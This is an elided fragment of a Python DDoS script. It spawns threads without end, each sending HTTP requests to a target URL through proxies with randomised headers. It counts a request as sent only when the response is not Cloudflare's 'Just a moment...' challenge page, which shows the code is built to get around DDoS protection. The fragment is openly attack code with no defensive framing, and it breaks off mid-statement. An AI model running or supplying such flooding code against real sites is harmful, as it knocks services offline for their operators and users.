...
def ddos(prox, url):
	...
	while True:
		...
		headers2 = Headers(headers=True).generate()
		t = threading.Thread(target=start_ddos, args=(prox, url, headers1, headers2, proxies, color))
		t.start()

def start_ddos(prox, url, headers1, headers2, proxies, color):
	try:
		times = [0.1, 0.2, 0.3]
		s1 = r.Session()
		s2 = r.Session()
		req1 = s1.get(url, headers=headers1, proxies=proxies)
		req2 = s2.get(url, headers=headers2, proxies=proxies)
		...
		if req2.status_code == 200:
			if "<title>Just a moment...</title>" in req2.text:
				pass
			else:
				print(color+"{} sent requests...".format(prox))
	except:
